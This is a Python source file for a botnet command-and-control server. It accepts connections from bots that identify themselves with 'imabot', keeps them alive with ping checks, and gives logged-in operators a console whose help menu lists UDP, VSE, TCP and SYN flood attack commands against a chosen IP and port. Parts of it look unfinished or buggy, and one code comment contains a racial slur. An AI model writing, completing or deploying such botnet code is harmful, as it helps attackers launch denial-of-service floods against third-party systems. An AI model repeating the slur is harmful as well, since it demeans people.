import os
import sys
import socket
import threading
import time
from colorama import Fore, init

#port = int(sys.argv[1])
port = 800
botlist = [] # where all our bots are stocked

def sendcommand(data): # send a command to all bots
    for sock in botlist:
        print(f"sending {data} to all bots")
        sock.send(data.encode())

def pingroutine():
    for sock in botlist:
        try:
            sock.settimeout(1)
            socksend(sock, 'PING', False, False)
            sock.settimeout(2)
            try:
                if sock.recv(1024).decode() != 'PONG':
                    sock.close()
                    botlist.remove(sock)
            except:
                print("failed to receive ping")
        except:
            botlist.remove(sock)

def updatetitle(user):
    try:
        global so
        so.send((f"\x1b]0;{str(len(botlist))} Bots Connected | {user}\x07").encode())
        time.sleep(1)
    except:
        return


def find_login(username, password):
    credentials = [x.strip() for x in open('users.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def socksend(sock, msg, newline=True, resetcolor=True):
    if resetcolor:
        msg += Fore.RESET
    if newline:
        msg += '\r\n'
    sock.send(msg.encode())



def handleadmin(sock):
    print(f"handling new admin")

    global so
    so = sock

    try:
        # login system
        socksend(sock, "Username: ", False)
        username = sock.recv(1024).decode().strip()
        socksend(sock, "Password: ", False)
        password = sock.recv(1024).decode().strip()

        socksend(sock, "\n")
        socksend(sock, f"{Fore.LIGHTBLUE_EX}trying to login with {username}:{password}.")

        if not find_login(username, password):
            socksend(sock, f"{Fore.RED}[{username}:{password}] invalid username/password.")
            sock.close()
            

        #update the client console title
        threading.Thread(target=updatetitle,args=[username],daemon=True).start()

        # grab the banner and clear screen
        socksend(sock, "\033[2J\033[1H", False)
        banner = open('banner.txt', 'r').read()
        socksend(sock, f"{banner}")

        # cmds
        while True:
            socksend(sock, f"{Fore.MAGENTA}{username}{Fore.RESET}@{Fore.MAGENTA}botnet{Fore.RESET}$ ", False)
            cmd_str = sock.recv(1024).decode().strip()
            if len(cmd_str):
                if cmd_str[0] == '!':
                    print(f"[{username}] sending command to bots.")
                elif cmd_str == '?' or cmd_str == 'help':
                    socksend(sock, f'udp <ip> <port> <time> <len> <threads>')
                    socksend(sock, f'vse <ip> <port> <time> <len> <threads>')
                    socksend(sock, f'tcp <ip> <port> <time> <len> <threads>')
                    socksend(sock, f'syn <ip> <port> <time> <len> <threads>')
                elif cmd_str == 'clear':
                    socksend(sock, "\033[2J\033[1H", False)
                    socksend(sock, f"{banner}")
                elif cmd_str == 'exit':
                    sock.close()
                    break
                else:
                    socksend(sock, f"[{cmd_str}] {Fore.RED}invalid command.")
    except:
        print(f"error sending / receiving (client {username} left)") # happens when the client yeets the connection
        return


def registerclient(sock,addr):
    # judge if the client is a bot trying to connect or an admin trying to access the cnc
    print(f"registering {addr}")
    try:
        data = sock.recv(1024).decode()

        if "imabot" in data: # its gonna be enc ofc nigga 
            if sock not in botlist:
                botlist.append(sock)

        elif "\n" in data:
            handleadmin(sock)

    except:
        handleadmin(sock)


def main():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection

    s.bind(('0.0.0.0',port))
    s.listen(1024)

    while True:
        sock, addr = s.accept()
        threading.Thread(target=registerclient,args=(sock,addr),daemon=True).start()
        threading.Thread(target=pingroutine).start()

main()